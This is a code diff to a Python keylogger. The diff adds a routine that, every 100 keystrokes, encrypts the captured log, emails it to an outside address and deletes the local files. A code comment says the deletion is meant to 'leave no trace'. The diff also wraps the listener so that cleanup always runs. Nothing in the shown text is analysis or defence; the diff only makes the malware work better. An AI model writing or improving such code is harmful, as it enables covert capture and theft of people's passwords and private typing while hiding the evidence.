@@ -100,15 +100,21 @@ def release_log_file():
             handler.close()
             logger.removeHandler(handler)
 
+def reopen_logger():
+    logging.basicConfig(filename=(log_dir), level=logging.DEBUG, format="%(asctime)s: %(message)s")
 
 # delete files leave no trace and stuff
 def cleanup():
     try: 
-        release_log_file()
         os.remove(e_log_dir)
+    except Exception as e:
+        print(f'still couldnt delete{e}', )
+    try:
+        release_log_file()
         os.remove(log_dir)
     except Exception as e:
         print(f'still couldnt delete{e}', )
+
 
 # send email every 100 keystrokes
 def on_press(key):
@@ -117,14 +123,17 @@ def on_press(key):
     global count
     count += 1
     if count == 100:
-        print(100)
         encrypt()
         send_email(e_log_dir, e_log_dir, toaddr)
+        cleanup()
         count = 0
+        reopen_logger()
     if key == Key.esc:
         return False
 
 
-with Listener(on_press=on_press) as listener:
-    listener.join()
-cleanup()
+try: 
+    with Listener(on_press=on_press) as listener:
+        listener.join()
+finally:
+    cleanup()
